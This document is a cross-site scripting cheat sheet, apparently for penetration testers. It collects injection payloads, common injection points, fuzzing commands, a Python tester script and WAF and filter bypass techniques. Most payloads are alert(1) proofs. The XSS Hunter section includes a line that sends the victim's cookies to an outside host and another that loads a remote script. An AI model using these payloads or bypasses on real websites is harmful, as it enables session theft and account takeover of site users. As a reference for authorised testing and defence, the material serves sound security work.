# Cross-Site Scripting (XSS)

### Quick Payloads

#### Basic XSS

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<div onmouseover="alert(1)">Hover me</div>
```

#### Event Handlers

```html
onclick=alert(1)
onmouseover=alert(1)
onerror=alert(1)
onload=alert(1)
onfocus=alert(1)
onblur=alert(1)
```

#### JavaScript Events

```javascript
javascript:alert(1)
data:text/html,<script>alert(1)</script>
vbscript:alert(1)
```

#### DOM Based

```javascript
document.write('<script>alert(1)</script>')
eval('alert(1)')
setTimeout('alert(1)',0)
setInterval('alert(1)',0)
```

### Testing Methodology

#### 1. Parameter Fuzzing

```bash
# Using ffuf
ffuf -u "http://target.com/page?param=FUZZ" -w xss-payloads.txt

# Using Burp Suite
1. Intercept request
2. Send to Intruder
3. Select parameter
4. Load payload list
```

#### 2. Common Test Points

```
URL Parameters: ?search=<script>alert(1)</script>
Form Fields: <input name="username" value="<script>alert(1)</script>">
Headers: User-Agent: <script>alert(1)</script>
JSON: {"name": "<script>alert(1)</script>"}
```

#### 3. Context Testing

```html
# HTML Context
<div><script>alert(1)</script></div>
<div><img src=x onerror=alert(1)></div>

# Attribute Context
<input value=""><script>alert(1)</script>">
<input value=""><img src=x onerror=alert(1)>">

# JavaScript Context
<script>var x = "<script>alert(1)</script>";</script>
<script>var x = "\";alert(1);//";</script>
```

### Common Vulnerable Endpoints

#### Search Forms

```html
search=<script>alert(1)</script>
search=<img src=x onerror=alert(1)>
search=<svg onload=alert(1)>
```

#### Comment Sections

```html
comment=<script>alert(1)</script>
comment=<img src=x onerror=alert(1)>
comment=<svg onload=alert(1)>
```

#### User Profiles

```html
name=<script>alert(1)</script>
bio=<img src=x onerror=alert(1)>
avatar=<svg onload=alert(1)>
```

### Tools & Commands

#### XSS Hunter

```bash
# Basic payload
<script src="https://xss.ht"></script>

# DOM based
<script>fetch('https://xss.ht/'+document.cookie)</script>
```

#### Custom Python Script

```python
import requests

def test_xss(url, param, payloads):
    for payload in payloads:
        data = {param: payload}
        r = requests.post(url, data=data)
        if payload in r.text:
            print(f"Potential XSS: {payload}")
```

### Common Bypass Techniques

#### WAF Bypass

```html
# Case variation
<ScRiPt>alert(1)</ScRiPt>
<IMG src=x OnErRoR=alert(1)>

# Encoding
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
%3Cscript%3Ealert(1)%3C/script%3E

# Double encoding
%253Cscript%253Ealert(1)%253C/script%253E
```

#### Filter Bypass

```html
# Script tag bypass
<scr<script>ipt>alert(1)</scr</script>ipt>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

# Event handler bypass
<div onmouseover="alert(1)">Hover me</div>
<body onload=alert(1)>
```

### References

* [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
* [PortSwigger XSS](https://portswigger.net/web-security/cross-site-scripting)
* [XSS Hunter](https://xsshunter.com/)
